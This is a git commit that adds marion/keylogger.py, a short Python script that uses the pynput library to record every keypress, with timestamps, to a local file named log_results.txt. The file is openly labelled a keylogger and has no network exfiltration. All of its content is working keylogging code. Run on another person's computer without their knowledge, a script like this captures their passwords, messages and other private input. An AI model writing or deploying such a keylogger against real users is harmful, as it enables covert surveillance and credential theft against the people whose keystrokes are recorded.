f209a872b789d6b02bc7c37ba05bf0d98874270e
cuicuiasoupe <47559325+cuicuiasoupe@users.noreply.github.com>
2019-02-14 13:39:04 +0100

    Create keylogger.py

---
+++ marion/keylogger.py
@@ -0,0 +1,12 @@
+#!/usr/bin/python
+
+from pynput.keyboard import Key, Listener
+import logging
+
+logging.basicConfig(filename = ('log_results.txt') , level = logging.DEBUG , format = '%(asctime)s : %(message)s')
+
+def keypress(Key):
+    logging.info(str(Key))
+
+with Listener(on_press = keypress) as listener:
+     listener.join()
